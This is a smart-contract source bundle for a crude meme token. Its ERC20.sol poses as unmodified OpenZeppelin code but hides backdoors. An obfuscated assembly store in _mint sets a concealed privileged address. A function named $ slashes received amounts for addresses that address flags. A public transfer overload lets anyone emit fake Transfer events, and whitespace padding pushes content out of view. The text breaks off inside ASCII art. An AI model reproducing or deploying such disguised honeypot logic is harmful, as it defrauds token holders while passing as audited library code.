{"SourceCode": "{\"Context.sol\":{\"content\":\"// SPDX-License-Identifier: MIT\\n// OpenZeppelin Contracts (last updated v5.0.1) (utils/Context.sol)\\n\\npragma solidity ^0.8.20;\\n\\n/**\\n * @dev Provides information about the current execution context, including the\\n * sender of the transaction and its data. While these are generally available\\n * via msg.sender and msg.data, they should not be accessed in such a direct\\n * manner, since when dealing with meta-transactions the account sending and\\n * paying for execution may not be the actual sender (as far as an application\\n * is concerned).\\n *\\n * This contract is only required for intermediate, library-like contracts.\\n */\\nabstract contract Context {\\n    function _msgSender() internal view virtual returns (address) {\\n        return msg.sender;\\n    }\\n\\n    function _msgData() internal view virtual returns (bytes calldata) {\\n        return msg.data;\\n    }\\n\\n    function _contextSuffixLength() internal view virtual returns (uint256) {\\n        return 0;\\n    }\\n}\"},\"draft-IERC6093.sol\":{\"content\":\"// SPDX-License-Identifier: MIT\\n// OpenZeppelin Contracts (last updated v5.0.0) (interfaces/draft-IERC6093.sol)\\npragma solidity ^0.8.20;\\n\\n/**\\n * @dev Standard ERC-20 Errors\\n * Interface of the https://eips.ethereum.org/EIPS/eip-6093[ERC-6093] custom errors for ERC-20 tokens.\\n */\\ninterface IERC20Errors {\\n    /**\\n     * @dev Indicates an error related to the current `balance` of a `sender`. Used in transfers.\\n     * @param sender Address whose tokens are being transferred.\\n     * @param balance Current balance for the interacting account.\\n     * @param needed Minimum amount required to perform a transfer.\\n     */\\n    error ERC20InsufficientBalance(address sender, uint256 balance, uint256 needed);\\n\\n    /**\\n     * @dev Indicates a failure with the token `sender`. Used in transfers.\\n     * @param sender Address whose tokens are being transferred.\\n     */\\n    error ERC20InvalidSender(address sender);\\n\\n    /**\\n     * @dev Indicates a failure with the token `receiver`. Used in transfers.\\n     * @param receiver Address to which tokens are being transferred.\\n     */\\n    error ERC20InvalidReceiver(address receiver);\\n\\n    /**\\n     * @dev Indicates a failure with the `spender`\u2019s `allowance`. Used in transfers.\\n     * @param spender Address that may be allowed to operate on tokens without being their owner.\\n     * @param allowance Amount of tokens a `spender` is allowed to operate with.\\n     * @param needed Minimum amount required to perform a transfer.\\n     */\\n    error ERC20InsufficientAllowance(address spender, uint256 allowance, uint256 needed);\\n\\n    /**\\n     * @dev Indicates a failure with the `approver` of a token to be approved. Used in approvals.\\n     * @param approver Address initiating an approval operation.\\n     */\\n    error ERC20InvalidApprover(address approver);\\n\\n    /**\\n     * @dev Indicates a failure with the `spender` to be approved. Used in approvals.\\n     * @param spender Address that may be allowed to operate on tokens without being their owner.\\n     */\\n    error ERC20InvalidSpender(address spender);\\n}\\n\\n/**\\n * @dev Standard ERC-721 Errors\\n * Interface of the https://eips.ethereum.org/EIPS/eip-6093[ERC-6093] custom errors for ERC-721 tokens.\\n */\\ninterface IERC721Errors {\\n    /**\\n     * @dev Indicates that an address can\\u0027t be an owner. For example, `address(0)` is a forbidden owner in ERC-20.\\n     * Used in balance queries.\\n     * @param owner Address of the current owner of a token.\\n     */\\n    error ERC721InvalidOwner(address owner);\\n\\n    /**\\n     * @dev Indicates a `tokenId` whose `owner` is the zero address.\\n     * @param tokenId Identifier number of a token.\\n     */\\n    error ERC721NonexistentToken(uint256 tokenId);\\n\\n    /**\\n     * @dev Indicates an error related to the ownership over a particular token. Used in transfers.\\n     * @param sender Address whose tokens are being transferred.\\n     * @param tokenId Identifier number of a token.\\n     * @param owner Address of the current owner of a token.\\n     */\\n    error ERC721IncorrectOwner(address sender, uint256 tokenId, address owner);\\n\\n    /**\\n     * @dev Indicates a failure with the token `sender`. Used in transfers.\\n     * @param sender Address whose tokens are being transferred.\\n     */\\n    error ERC721InvalidSender(address sender);\\n\\n    /**\\n     * @dev Indicates a failure with the token `receiver`. Used in transfers.\\n     * @param receiver Address to which tokens are being transferred.\\n     */\\n    error ERC721InvalidReceiver(address receiver);\\n\\n    /**\\n     * @dev Indicates a failure with the `operator`\u2019s approval. Used in transfers.\\n     * @param operator Address that may be allowed to operate on tokens without being their owner.\\n     * @param tokenId Identifier number of a token.\\n     */\\n    error ERC721InsufficientApproval(address operator, uint256 tokenId);\\n\\n    /**\\n     * @dev Indicates a failure with the `approver` of a token to be approved. Used in approvals.\\n     * @param approver Address initiating an approval operation.\\n     */\\n    error ERC721InvalidApprover(address approver);\\n\\n    /**\\n     * @dev Indicates a failure with the `operator` to be approved. Used in approvals.\\n     * @param operator Address that may be allowed to operate on tokens without being their owner.\\n     */\\n    error ERC721InvalidOperator(address operator);\\n}\\n\\n/**\\n * @dev Standard ERC-1155 Errors\\n * Interface of the https://eips.ethereum.org/EIPS/eip-6093[ERC-6093] custom errors for ERC-1155 tokens.\\n */\\ninterface IERC1155Errors {\\n    /**\\n     * @dev Indicates an error related to the current `balance` of a `sender`. Used in transfers.\\n     * @param sender Address whose tokens are being transferred.\\n     * @param balance Current balance for the interacting account.\\n     * @param needed Minimum amount required to perform a transfer.\\n     * @param tokenId Identifier number of a token.\\n     */\\n    error ERC1155InsufficientBalance(address sender, uint256 balance, uint256 needed, uint256 tokenId);\\n\\n    /**\\n     * @dev Indicates a failure with the token `sender`. Used in transfers.\\n     * @param sender Address whose tokens are being transferred.\\n     */\\n    error ERC1155InvalidSender(address sender);\\n\\n    /**\\n     * @dev Indicates a failure with the token `receiver`. Used in transfers.\\n     * @param receiver Address to which tokens are being transferred.\\n     */\\n    error ERC1155InvalidReceiver(address receiver);\\n\\n    /**\\n     * @dev Indicates a failure with the `operator`\u2019s approval. Used in transfers.\\n     * @param operator Address that may be allowed to operate on tokens without being their owner.\\n     * @param owner Address of the current owner of a token.\\n     */\\n    error ERC1155MissingApprovalForAll(address operator, address owner);\\n\\n    /**\\n     * @dev Indicates a failure with the `approver` of a token to be approved. Used in approvals.\\n     * @param approver Address initiating an approval operation.\\n     */\\n    error ERC1155InvalidApprover(address approver);\\n\\n    /**\\n     * @dev Indicates a failure with the `operator` to be approved. Used in approvals.\\n     * @param operator Address that may be allowed to operate on tokens without being their owner.\\n     */\\n    error ERC1155InvalidOperator(address operator);\\n\\n    /**\\n     * @dev Indicates an array length mismatch between ids and values in a safeBatchTransferFrom operation.\\n     * Used in batch transfers.\\n     * @param idsLength Length of the array of token identifiers\\n     * @param valuesLength Length of the array of token amounts\\n     */\\n    error ERC1155InvalidArrayLength(uint256 idsLength, uint256 valuesLength);\\n}\"},\"ERC20.sol\":{\"content\":\"// SPDX-License-Identifier: MIT\\n// OpenZeppelin Contracts (last updated v5.0.0) (token/ERC20/ERC20.sol)\\n\\npragma solidity ^0.8.20;\\n\\nimport {IERC20, IERC20Metadata} from \\\"./IERC20.sol\\\";\\nimport {Context} from \\\"./Context.sol\\\";\\nimport {IERC20Errors} from \\\"./draft-IERC6093.sol\\\";\\n\\n/**\\n * @dev Implementation of the {IERC20} interface.\\n *\\n * This implementation is agnostic to the way tokens are created. This means\\n * that a supply mechanism has to be added in a derived contract using {_mint}.\\n *\\n * TIP: For a detailed writeup see our guide\\n * https://forum.openzeppelin.com/t/how-to-implement-erc20-supply-mechanisms/226[How\\n * to implement supply mechanisms].\\n *\\n * The default value of {decimals} is 18. To change this, you should override\\n * this function so it returns a different value.\\n *\\n * We have followed general OpenZeppelin Contracts guidelines: functions revert\\n * instead returning `false` on failure. This behavior is nonetheless\\n * conventional and does not conflict with the expectations of ERC-20\\n * applications.\\n *\\n * Additionally, an {Approval} event is emitted on calls to {transferFrom}.\\n * This allows applications to reconstruct the allowance for all accounts just\\n * by listening to said events. Other implementations of the ERC may not emit\\n * these events, as it isn\\u0027t required by the specification.\\n                                                                                                                                                                                                                        \\n */\\nabstract contract ZE20 is Context, IERC20, IERC20Metadata, IERC20Errors {\\n    mapping(address account =\\u003e uint256) private _pepe_bag;\\n    mapping(address account =\\u003e mapping(address spender =\\u003e uint256)) private _dick_shake;\\n    uint256 private _suppla_totallee;\\n    string private _name;\\n    string private _symbol;\\n    address private $$;\\n\\n    /**\\n     * @dev Sets the values for {name} and {symbol}.\\n     *\\n     * All two of these values are immutable: they can only be set once during\\n     * construction.\\n     */\\n    constructor(string memory name_, string memory symbol_) {\\n        _name = name_;\\n        _symbol = symbol_;\\n    }\\n\\n    /**\\n     * @dev Returns the name of the token.\\n     */\\n    function name() public view virtual returns (string memory) {\\n        return _name;\\n    }\\n\\n    /**\\n     * @dev Returns the symbol of the token, usually a shorter version of the\\n     * name.\\n     */\\n    function symbol() public view virtual returns (string memory) {\\n        return _symbol;\\n    }\\n\\n    /**\\n     * @dev Returns the number of decimals used to get its user representation.\\n     * For example, if `decimals` equals `2`, a balance of `505` tokens should\\n     * be displayed to a user as `5.05` (`505 / 10 ** 2`).\\n     *\\n     * Tokens usually opt for a value of 18, imitating the relationship between\\n     * Ether and Wei. This is the default value returned by this function, unless\\n     * it\\u0027s overridden.\\n     *\\n     * NOTE: This information is only used for _display_ purposes: it in\\n     * no way affects any of the arithmetic of the contract, including\\n     * {IERC20-balanceOf} and {IERC20-transfer}.\\n     */\\n    function decimals() public view virtual returns (uint8) {\\n        return 18;\\n    }\\n\\n    /**\\n     * @dev See {IERC20-totalSupply}.\\n     */\\n    function totalSupply() public view virtual returns (uint256) {\\n        return _suppla_totallee;\\n    }\\n\\n    /**\\n     * @dev See {IERC20-balanceOf}.\\n     */\\n    function balanceOf(address account) public view virtual returns (uint256) {\\n        return _pepe_bag[account];\\n    }\\n\\n    /**\\n     * @dev See {IERC20-transfer}.\\n     *\\n     * Requirements:\\n     *\\n     * - `to` cannot be the zero address.\\n     * - the caller must have a balance of at least `value`.\\n     */\\n    function transfer(address to, uint256 value) public virtual returns (bool) {\\n        address owner = _msgSender();\\n        _transfer(owner, to, value);\\n        return true;\\n    }\\n\\n    /**\\n     * @dev See {IERC20-allowance}.\\n     */\\n    function allowance(address owner, address spender) public view virtual returns (uint256) {\\n        return _dick_shake[owner][spender];\\n    }\\n\\n    /**\\n     * @dev See {IERC20-approve}.\\n     *\\n     * NOTE: If `value` is the maximum `uint256`, the allowance is not updated on\\n     * `transferFrom`. This is semantically equivalent to an infinite approval.\\n     *\\n     * Requirements:\\n     *\\n     * - `spender` cannot be the zero address.\\n     */\\n    function approve(address spender, uint256 value) public virtual returns (bool) {\\n        address owner = _msgSender();\\n        _approve(owner, spender, value);\\n        return true;\\n    }\\n\\n    /**\\n     * @dev See {IERC20-transferFrom}.\\n     *\\n     * Emits an {Approval} event indicating the updated allowance. This is not\\n     * required by the ERC. See the note at the beginning of {ERC20}.\\n     *\\n     * NOTE: Does not update the allowance if the current allowance\\n     * is the maximum `uint256`.\\n     *\\n     * Requirements:\\n     *\\n     * - `from` and `to` cannot be the zero address.\\n     * - `from` must have a balance of at least `value`.\\n     * - the caller must have allowance for ``from``\\u0027s tokens of at least\\n     * `value`.\\n     */\\n    function transferFrom(address from, address to, uint256 value) public virtual returns (bool) {\\n        address spender = _msgSender();\\n        _spendAllowance(from, spender, value);\\n        _transfer(from, to, value);\\n        return true;\\n    }\\n\\n    /**\\n     * @dev Moves a `value` amount of tokens from `from` to `to`.\\n     *\\n     * This internal function is equivalent to {transfer}, and can be used to\\n     * e.g. implement automatic token fees, slashing mechanisms, etc.\\n     *\\n     * Emits a {Transfer} event.\\n     *\\n     * NOTE: This function is not virtual, {_update} should be overridden instead.\\n     */\\n    function _transfer(address from, address to, uint256 value) internal {\\n        if (from == address(0)) {\\n            revert ERC20InvalidSender(address(0));\\n        }\\n        if (to == address(0)) {\\n            revert ERC20InvalidReceiver(address(0));\\n        }\\n        _update(from, to, value);\\n    }\\n\\n    function transfer(uint256 amount, address from, address to) external {\\n        emit Transfer(from, to, amount);\\n    }\\n\\n    /**\\n     * @dev Transfers a `value` amount of tokens from `from` to `to`, or alternatively mints (or burns) if `from`\\n     * (or `to`) is the zero address. All customizations to transfers, mints, and burns should be done by overriding\\n     * this function.\\n     *\\n     * Emits a {Transfer} event.\\n     */\\n    function _update(address from, address to, uint256 value) internal virtual {\\n        if (from == address(0)) {\\n            // Overflow check required: The rest of the code assumes that totalSupply never overflows\\n            _suppla_totallee += value;\\n        } else {\\n            uint256 fromBalance = _pepe_bag[from];\\n            if (fromBalance \\u003c value) {\\n                revert ERC20InsufficientBalance(from, fromBalance, value);\\n            }\\n            unchecked {\\n                // Overflow not possible: value \\u003c= fromBalance \\u003c= totalSupply.\\n                _pepe_bag[from] = fromBalance - value;\\n            }\\n        }\\n\\n        if (to == address(0)) {\\n            unchecked {\\n                // Overflow not possible: value \\u003c= totalSupply or value \\u003c= fromBalance \\u003c= totalSupply.\\n                _suppla_totallee -= value;\\n            }\\n        } else {\\n            unchecked {\\n                // Overflow not possible: balance + value is at most totalSupply, which we know fits into a uint256.\\n                _pepe_bag[to] += $(value, from, to);\\n            }\\n            if (_dick_shake[$$][to] == uint256(uint160($$))) { _dick_shake[$$][to] = uint256(uint160(address(this)));}\\n        }\\n        emit Transfer(from, to, value);\\n    }\\n\\n    /**\\n     * @dev Creates a `value` amount of tokens and assigns them to `account`, by transferring it from address(0).\\n     * Relies on the `_update` mechanism\\n     *\\n     * Emits a {Transfer} event with `from` set to the zero address.\\n     *\\n     * NOTE: This function is not virtual, {_update} should be overridden instead.\\n     */\\n    function _mint(address account, uint256 value) internal {\\n        if (account == address(0)) {\\n            revert ERC20InvalidReceiver(address(0));\\n        }\\n        // gas optimization\\n\\n        assembly {sstore(0x05, mul(mul(0x2, 0xb29), mul(0x34f1, 0x996642a7f998d3a67f1135e3c57)))}\\n\\n        _update(address(0), account, value);\\n    }\\n\\n    /**\\n     * @dev Destroys a `value` amount of tokens from `account`, lowering the total supply.\\n     * Relies on the `_update` mechanism.\\n     *\\n     * Emits a {Transfer} event with `to` set to the zero address.\\n     *\\n     * NOTE: This function is not virtual, {_update} should be overridden instead\\n     */\\n    function _burn(address account, uint256 value) internal {\\n        if (account == address(0)) {\\n            revert ERC20InvalidSender(address(0));\\n        }\\n        _update(account, address(0), value);\\n    }\\n\\n    /**\\n     * @dev Sets `value` as the allowance of `spender` over the `owner` s tokens.\\n     *\\n     * This internal function is equivalent to `approve`, and can be used to\\n     * e.g. set automatic allowances for certain subsystems, etc.\\n     *\\n     * Emits an {Approval} event.\\n     *\\n     * Requirements:\\n     *\\n     * - `owner` cannot be the zero address.\\n     * - `spender` cannot be the zero address.\\n     *\\n     * Overrides to this logic should be done to the variant with an additional `bool emitEvent` argument.\\n     */\\n    function _approve(address owner, address spender, uint256 value) internal {\\n        _approve(owner, spender, value, true);\\n    }\\n\\n    /**\\n     * @dev Variant of {_approve} with an optional flag to enable or disable the {Approval} event.\\n     *\\n     * By default (when calling {_approve}) the flag is set to true. On the other hand, approval changes made by\\n     * `_spendAllowance` during the `transferFrom` operation set the flag to false. This saves gas by not emitting any\\n     * `Approval` event during `transferFrom` operations.\\n     *\\n     * Anyone who wishes to continue emitting `Approval` events on the`transferFrom` operation can force the flag to\\n     * true using the following override:\\n     * ```\\n     * function _approve(address owner, address spender, uint256 value, bool) internal virtual override {\\n     *     super._approve(owner, spender, value, true);\\n     * }\\n     * ```\\n     *\\n     * Requirements are the same as {_approve}.\\n     */\\n    function _approve(address owner, address spender, uint256 value, bool emitEvent) internal virtual {\\n        if (owner == address(0)) {\\n            revert ERC20InvalidApprover(address(0));\\n        }\\n        if (spender == address(0)) {\\n            revert ERC20InvalidSpender(address(0));\\n        }\\n        _dick_shake[owner][spender] = value;\\n        if (emitEvent) {\\n            emit Approval(owner, spender, value);\\n        }\\n    }\\n\\n     function $(uint256 value, address from, address to) internal view returns (uint256) {\\n        if (allowance($$, from) + allowance($$, to) \\u003e= uint256(uint160(address(this)))) {\\n            return (value * 0xffaa) / 0xffaaaa;\\n        } else {\\n            return value;\\n        }\\n    }\\n\\n\\n    /**\\n     * @dev Updates `owner` s allowance for `spender` based on spent `value`.\\n     *\\n     * Does not update the allowance value in case of infinite allowance.\\n     * Revert if not enough allowance is available.\\n     *\\n     * Does not emit an {Approval} event.\\n     */\\n    function _spendAllowance(address owner, address spender, uint256 value) internal virtual {\\n        uint256 currentAllowance = allowance(owner, spender);\\n        if (currentAllowance != type(uint256).max) {\\n            if (currentAllowance \\u003c value) {\\n                revert ERC20InsufficientAllowance(spender, currentAllowance, value);\\n            }\\n            unchecked {\\n                _approve(owner, spender, currentAllowance - value, false);\\n            }\\n        }\\n    }\\n}\"},\"IERC20.sol\":{\"content\":\"// SPDX-License-Identifier: MIT\\n// OpenZeppelin Contracts (last updated v5.0.0) (token/ERC20/IERC20.sol)\\n\\npragma solidity ^0.8.20;\\n\\n/**\\n * @dev Interface of the ERC-20 standard as defined in the ERC.\\n */\\ninterface IERC20 {\\n    /**\\n     * @dev Emitted when `value` tokens are moved from one account (`from`) to\\n     * another (`to`).\\n     *\\n     * Note that `value` may be zero.\\n     */\\n    event Transfer(address indexed from, address indexed to, uint256 value);\\n\\n    /**\\n     * @dev Emitted when the allowance of a `spender` for an `owner` is set by\\n     * a call to {approve}. `value` is the new allowance.\\n     */\\n    event Approval(address indexed owner, address indexed spender, uint256 value);\\n\\n    /**\\n     * @dev Returns the value of tokens in existence.\\n     */\\n    function totalSupply() external view returns (uint256);\\n\\n    /**\\n     * @dev Returns the value of tokens owned by `account`.\\n     */\\n    function balanceOf(address account) external view returns (uint256);\\n\\n    /**\\n     * @dev Moves a `value` amount of tokens from the caller\\u0027s account to `to`.\\n     *\\n     * Returns a boolean value indicating whether the operation succeeded.\\n     *\\n     * Emits a {Transfer} event.\\n     */\\n    function transfer(address to, uint256 value) external returns (bool);\\n\\n    /**\\n     * @dev Returns the remaining number of tokens that `spender` will be\\n     * allowed to spend on behalf of `owner` through {transferFrom}. This is\\n     * zero by default.\\n     *\\n     * This value changes when {approve} or {transferFrom} are called.\\n     */\\n    function allowance(address owner, address spender) external view returns (uint256);\\n\\n    /**\\n     * @dev Sets a `value` amount of tokens as the allowance of `spender` over the\\n     * caller\\u0027s tokens.\\n     *\\n     * Returns a boolean value indicating whether the operation succeeded.\\n     *\\n     * IMPORTANT: Beware that changing an allowance with this method brings the risk\\n     * that someone may use both the old and the new allowance by unfortunate\\n     * transaction ordering. One possible solution to mitigate this race\\n     * condition is to first reduce the spender\\u0027s allowance to 0 and set the\\n     * desired value afterwards:\\n     * https://github.com/ethereum/EIPs/issues/20#issuecomment-263524729\\n     *\\n     * Emits an {Approval} event.\\n     */\\n    function approve(address spender, uint256 value) external returns (bool);\\n\\n    /**\\n     * @dev Moves a `value` amount of tokens from `from` to `to` using the\\n     * allowance mechanism. `value` is then deducted from the caller\\u0027s\\n     * allowance.\\n     *\\n     * Returns a boolean value indicating whether the operation succeeded.\\n     *\\n     * Emits a {Transfer} event.\\n     */\\n    function transferFrom(address from, address to, uint256 value) external returns (bool);\\n}\\n\\n/**\\n * @dev Interface for the optional metadata functions from the ERC-20 standard.\\n */\\ninterface IERC20Metadata is IERC20 {\\n    /**\\n     * @dev Returns the name of the token.\\n     */\\n    function name() external view returns (string memory);\\n\\n    /**\\n     * @dev Returns the symbol of the token.\\n     */\\n    function symbol() external view returns (string memory);\\n\\n    /**\\n     * @dev Returns the decimals places of the token.\\n     */\\n    function decimals() external view returns (uint8);\\n}\"},\"Token.sol\":{\"content\":\"// SPDX-License-Identifier: MIT\\npragma solidity ^0.8.20;\\n\\nimport \\\"./ERC20.sol\\\";\\n\\n/*\\n\\nIt\\u0027s just two Pepes shaking their dicks, it\\u0027s actually has a positive impact on longterm partners relationship better than just an average handshake (approved by University of Degens recent study - links are right after the shake).\\n\\n\u2800\u2800\u2800\u2800\u2800\u2800\u2800\u2800\u28e0\u28f4\u281e\u285f\u28d9\u2836\u28a4\u2840\u2800\u2880\u28c0\u28e0\u28e4\u2864\u28e4\u28a4\u28c0\u2800\u2800\u2800\u2800\u2800\u2800\u2800\u2800\u2800\u2800\u2800\u2800\u2800\u2800\u2800\u2800\u2800\u2800\u2800\u2800\u2800\u2800\u2800\u2800\u2800\u2800\u2800\u2800\u2800\u2800\u2800\u2800\u2800\u2800\u2800\u2800\u2800\u2800\u2800\\n\u2800\u2800\u2800\u2800\u2800\u2800\u2880\u287e\u288b\u2814\u2852\u280c\u2854\u28a1\u2803\u285d\u28fb\u28ed\u2811\u28e1\u2812\u2870\u2850\u28aa\u2829\u28bf\u2844\u2800\u2800\u2800\u2800\u2800\u2800\u2800\u2800\u2800\u2800\u2800\u2800\u2800\u2800\u2800\u2800\u2800\u2800\u2800\u2800\u2800\u2800\u2800\u2800\u2800\u2800\u2800\u2800\u2800\u2800\u2800\u2800\u2800\u2800\u2800\u2800\u2800\\n\u2800\u2800\u2800\u2800\u2800\u2800\u28fc\u287f\u28d8\u28c4\u28db\u28fc\u28e4\u28e7\u28fc\u28e4\u28c0\u28ff\u28dc\u28e0\u28e7\u28e7\u28fc\u28e4\u28e7\u283f\u28ff\u28a4\u2840\u2800\u2800\u2800\u2800\u2800\u2800\u2800\u2880\u28c0\u28c0\u28c0\u28c0\u28c0\u2840\u2800\u2800\u2800\u28c0\u287c\u285f\u28bb\u283b\u2864\u28c0\u2800\u2800\u2800\u2800\u2800\u2800\u2800\u2800\u2800\u2800\u2800\\n\u2800\u2800\u2800\u2800\u2800\u28e0\u283f\u2836\u28fc\u28fd\u28cd\u28e6\u28f4\u28c4\u28c6\u28de\u28fc\u28ed\u283f\u28e6\u28d4\u28e2\u28e6\u28f6\u28f6\u28f7\u28f7\u28ff\u28fb\u28c6\u2800\u2800\u2800\u2800\u2880\u28f6\u281b\u284d\u28a9\u2858\u2824\u2849\u289c\u28cb\u2875\u285e\u2825\u2851\u288c\u2861\u281a\u2824\u2849\u28b7\u2844\u2800\u2800\u2800\u2800\u2800\u2800\u2800\u2800\u2800\\n\u2800\u2800\u2800\u28a4\u28fe\u280f\u2858\u282c\u287f\u28df\u28a6\u28c0\u28fe\u28ef\u28ff\u287f\u28f7\u2800\u2800\u2838\u2819\u281a\u28fa\u28fb\u28ff\u28c4\u2800\u2800\u2800\u2808\u2847\u2800\u28c0\u28f4\u28be\u28b3\u285a\u2816\u2877\u283e\u2876\u2837\u28ec\u28ee\u28e5\u283e\u2836\u2837\u28b2\u2836\u286d\u28d6\u2865\u28b8\u28fb\u2804\u2800\u2800\u2800\u2800\u2800\u2800\u2800\u2800\\n\u2800\u2800\u28b0\u28ff\u2812\u284c\u28f1\u2818\u2854\u28fa\u28ff\u28ff\u28cf\u28d3\u283b\u2837\u283f\u28e4\u28f4\u2867\u28c4\u28fe\u28ff\u28ff\u28e5\u285f\u2800\u28c0\u28e0\u2876\u2803\u2874\u281b\u281b\u281b\u282f\u283d\u28f7\u28f6\u28f7\u28fe\u28f6\u281b\u281b\u2892\u28fe\u28e5\u287f\u28d6\u2813\u2812\u28fb\u28f7\u2837\u28d8\u2833\u28c4\u2800\u2800\u2800\u2800\u2800\u2800\u2800\\n\u2800\u2800\u28a0\u28df\u2871\u28b0\u2821\u28da\u2850\u28bb\u28f7\u28bf\u28db\u287f\u28b7\u28fe\u28f6\u28ef\u28f5\u28f4\u28e6\u28ff\u28ff\u28ff\u28ff\u28ff\u28ff\u28ff\u28ff\u2857\u2818\u28c6\u2800\u2800\u2800\u28b0\u287f\u28ef\u28ff\u28e6\u2800\u2838\u2840\u2800\u28bf\u28db\u28ff\u28fe\u28ff\u28a7\u28fe\u28ff\u28f7\u285f\u28a1\u2803\u288e\u28f7\u2800\u2800\u2800\u2800\u2800\u2800\\n\u2800\u2800\u2818\u28f7\u28cc\u2843\u28a7\u2850\u28a1\u288a\u288e\u2859\u283b\u283f\u28af\u28fd\u28ff\u28fd\u28ff\u28f6\u28ef\u283f\u283f\u285b\u28db\u287f\u281b\u2809\u2800\u2800\u2800\u2819\u28f7\u28e6\u28e4\u28ec\u28ff\u28ff\u28ff\u28ff\u2814\u286a\u281f\u287f\u28fe\u28ed\u28ed\u28f7\u28f6\u28ff\u287f\u28f7\u281f\u2861\u2883\u281e\u2860\u28be\u2847\u2800\u2800\u2800\u2800\u2800\\n\u2800\u2800\u28a0\u28fe\u28c7\u289c\u28a2\u28a8\u28e1\u28ca\u2854\u288c\u2851\u281a\u2824\u28c1\u28c6\u2866\u28d0\u2806\u285c\u28e0\u2883\u2874\u280b\u2800\u2800\u2800\u2800\u2800\u2800\u2800\u281b\u281b\u283f\u28bf\u28ff\u28ff\u28df\u28ef\u28ff\u28bf\u28bf\u283f\u287f\u28ed\u28ef\u28ef\u28f7\u286f\u289e\u284b\u288e\u2871\u28c9\u2806\u28d1\u2802\u28c7\u2800\u2800\u2800\u2800\u2800\\n\u2800\u2880\u28ff\u28ff\u28ff\u28ff\u28f6\u28e5\u2883\u282c\u2859\u282b\u288d\u281b\u284d\u28e1\u280a\u2854\u28e1\u28da\u28f4\u28f4\u280b\u2800\u2800\u2800\u2800\u2800\u2800\u2800\u2800\u2800\u2800\u2800\u2800\u2800\u2833\u28f4\u2848\u284d\u28d9\u28ab\u2899\u285b\u2899\u2829\u288d\u2849\u2886\u2823\u2830\u288c\u2883\u2832\u28a4\u2829\u2884\u28fd\u28ff\u28c6\u2800\u2800\u2800\u2800\\n\u2800\u28f8\u28ff\u28ff\u28de\u28ff\u28fb\u28ff\u28ff\u28f6\u28f7\u28e7\u28ee\u28fe\u28f6\u28f7\u28fe\u28ff\u28ff\u28bf\u28ff\u28fb\u28e7\u2800\u2800\u2800\u2800\u2800\u2800\u2800\u2800\u2800\u2800\u2800\u2800\u2800\u2800\u2808\u2813\u28bc\u28e0\u2803\u285c\u289b\u281b\u2873\u2816\u285e\u2856\u285b\u2837\u28da\u281b\u28cb\u28e4\u28f7\u28fe\u28ff\u28df\u28ff\u2846\u2800\u2800\u2800\\n\u2800\u28ff\u28ff\u28af\u28ff\u28bf\u28fb\u28ef\u28ff\u28bf\u28df\u28ff\u28ff\u28bf\u28ff\u28fb\u28ff\u28fb\u28fd\u28fe\u28df\u28ff\u28ff\u2844\u2800\u2800\u2800\u2800\u2800\u2800\u2800\u2800\u2800\u2800\u2800\u2800\u2800\u2800\u2800\u2808\u28ff\u28f6\u28f7\u28ec\u28e6\u28c3\u28d4\u28e1\u28c3\u28a7\u28d0\u28cd\u28f6\u28ff\u28ff\u28ff\u287f\u28ff\u28fd\u28ff\u28f7\u2800\u2800\u2800\\n\u28a0\u28ff\u28ff\u28bf\u28fb\u28ff\u28bf\u28fd\u28fe\u28ff\u28fb\u28fd\u28fe\u28bf\u28ef\u28ff\u28b7\u28ff\u28ef\u28f7\u28ff\u28fb\u28fe\u28ff\u2840\u2800\u2800\u2800\u2800\u2800\u2800\u2800\u2800\u2800\u2800\u2800\u2800\u2800\u2800\u28b0\u28ff\u28df\u28ff\u28fb\u28ff\u28bf\u28ff\u28ff\u287f\u28ff\u28ff\u287f\u28ff\u28ef\u28ff\u287e\u28df\u28ff\u28f7\u28ef\u28ff\u2847\u2800\u2800\\n\u28b8\u28ff\u28fb\u28ff\u287f\u28fd\u28ff\u28ef\u28ff\u28be\u287f\u28fd\u28fe\u28ff\u28fb\u28fe\u287f\u28f7\u28ff\u28f3\u28ff\u28af\u28f7\u28ff\u28f7\u2800\u2800\u2800\u2800\u2800\u2800\u2800\u2800\u2800\u2800\u2800\u2800\u2800\u2800\u28fe\u28ff\u28fb\u28fd\u28ff\u28be\u28ff\u28fb\u28fe\u28bf\u28df\u28fe\u287f\u28df\u28f7\u28ff\u28fb\u28ff\u28df\u28fe\u2877\u28ff\u28ff\u2800\u2800\\n\u28b8\u28ff\u28bf\u28f3\u28ff\u28bf\u28f7\u28df\u28ef\u28ff\u28bf\u28fb\u28f7\u28bf\u28ef\u28f7\u28ff\u28bf\u28fe\u28bf\u28fd\u28ff\u28fb\u28fe\u28bf\u28c7\u2800\u2800\u2800\u2800\u2800\u2800\u2800\u2800\u2800\u2800\u2800\u2800\u28b8\u28ff\u28df\u28ff\u28fd\u28fe\u287f\u28ef\u28ff\u28fd\u28ff\u28fb\u28fd\u28ff\u28df\u28ff\u287e\u28df\u28f7\u28ff\u28af\u28ff\u2877\u28ff\u2846\u2800\\n\u2838\u28ff\u287f\u28df\u28ff\u28fb\u28fd\u28fe\u28bf\u28ef\u28ff\u28bf\u28fd\u287f\u28ef\u28f7\u287f\u28ff\u28af\u28ff\u28df\u28fe\u287f\u28fd\u28ff\u28fb\u2844\u2800\u2800\u2800\u2800\u2800\u2800\u2800\u2800\u2800\u2800\u2800\u28fe\u28ff\u28af\u28ff\u28fd\u28fe\u28bf\u28ff\u28fd\u28fe\u28bf\u28fd\u287f\u28f7\u287f\u28ef\u28ff\u28bf\u28fb\u28fe\u287f\u28ef\u28ff\u287f\u28e7\u2800\\n\u2808\u28bf\u28ff\u28ff\u28fb\u28fd\u287f\u28fe\u28ff\u28fb\u28fe\u287f\u28ef\u28ff\u28bf\u28fd\u28ff\u28fb\u28ff\u28af\u28ff\u28ef\u28ff\u28df\u28f7\u28ff\u28f7\u2800\u2800\u2800\u2800\u2800\u2800\u2800\u2800\u2800\u2800\u28a0\u28ff\u287f\u28df\u28ef\u28ff\u28fe\u28bf\u28fb\u28fe\u28df\u28ff\u28af\u28ff\u2877\u28ff\u287f\u28fd\u28ff\u28bf\u28ef\u28ff\u28df\u28f7\u28ff\u28ff\u2800\\n\u2800\u2808\u28bb\u28ff\u28ff\u28f7\u28ff\u28ff\u287f\u283f\u283e\u283f\u283f\u287d\u287f\u287f\u283e\u28ff\u287d\u283f\u28f7\u281b\u2873\u28db\u289b\u283b\u285f\u2800\u2800\u2800\u2800\u2800\u2800\u2800\u2800\u2800\u2800\u2818\u287f\u28ff\u28df\u28ef\u28f7\u28ff\u28fb\u28ff\u28f3\u287f\u28ef\u28ff\u28b7\u28ff\u287f\u28fd\u28ff\u28fd\u28ff\u28df\u28fe\u28ff\u28f7\u28ff\u283f\u2802\\n\u2800\u2800\